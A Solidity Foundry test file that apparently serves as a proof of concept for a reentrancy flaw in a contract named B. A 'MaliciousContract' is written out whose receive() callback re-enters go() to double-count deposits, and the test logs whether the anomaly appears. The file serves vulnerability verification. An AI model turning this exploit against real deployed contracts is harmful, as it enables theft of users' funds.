// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf29ebe930a539a60279ace72c707cba851a57707.sol";

contract ReentrancyTest is Test {
    B vulnerable;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address payable constant TARGET = payable(0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C);
    
    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(attacker, 1 ether);
        
        vm.startPrank(owner);
        vulnerable = new B();
        vm.stopPrank();
        
        // Deploy malicious contract to fixed target address
        bytes memory code = type(MaliciousContract).runtimeCode;
        vm.etch(TARGET, code);
        // Initialize the malicious contract
        MaliciousContract(TARGET).init(payable(address(vulnerable)));
    }

    function testReentrancyAttack() public {
        // BEFORE: Record initial state snapshot
        uint totalDepositsBefore = vulnerable.totalDeposits();
        uint totalWithdrawalsBefore = vulnerable.totalWithdrawals();
        uint attackerDepositBefore = vulnerable.userDeposits(attacker);
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Total Deposits: %s", totalDepositsBefore);
        console.log("Total Withdrawals: %s", totalWithdrawalsBefore);
        console.log("Attacker Deposit: %s", attackerDepositBefore);

        console.log("--- Trigger Attack: go() called with 1 ether ---");
        vm.prank(attacker);
        vulnerable.go{value: 1 ether}();

        // AFTER: Record post-attack state snapshot
        uint totalDepositsAfter = vulnerable.totalDeposits();
        uint totalWithdrawalsAfter = vulnerable.totalWithdrawals();
        uint attackerDepositAfter = vulnerable.userDeposits(attacker);
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Total Deposits: %s", totalDepositsAfter);
        console.log("Total Withdrawals: %s", totalWithdrawalsAfter);
        console.log("Attacker Deposit: %s", attackerDepositAfter);
        
        // Compute differentials
        console.log("--- DIFF Analysis ---");
        uint depositDiff = totalDepositsAfter - totalDepositsBefore;
        uint withdrawalDiff = totalWithdrawalsAfter - totalWithdrawalsBefore;
        uint attackerDepositDiff = attackerDepositAfter - attackerDepositBefore;
        
        console.log("Total Deposits Change: %s", depositDiff);
        console.log("Total Withdrawals Change: %s", withdrawalDiff);
        console.log("Attacker Deposit Change: %s", attackerDepositDiff);

        // Vulnerability detection logic (focus on deposit anomalies)
        bool isDepositAnomaly = (depositDiff == 2 ether);
        bool isAttackerDepositAnomaly = (attackerDepositDiff == 1 ether);
        
        if (isDepositAnomaly && isAttackerDepositAnomaly) {
            console.log("Vulnerability Exists: Reentrancy attack doubled deposits from single transaction");
        } else {
            console.log("Vulnerability not Exist: State changes inconsistent with reentrancy exploitation");
        }
    }
}

contract MaliciousContract {
    B public vulnerable;
    bool private attacked;

    function init(address payable _vulnerable) public {
        vulnerable = B(_vulnerable);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // Reenter vulnerable contract during callback
            vulnerable.go{value: msg.value}();
        }
    }
}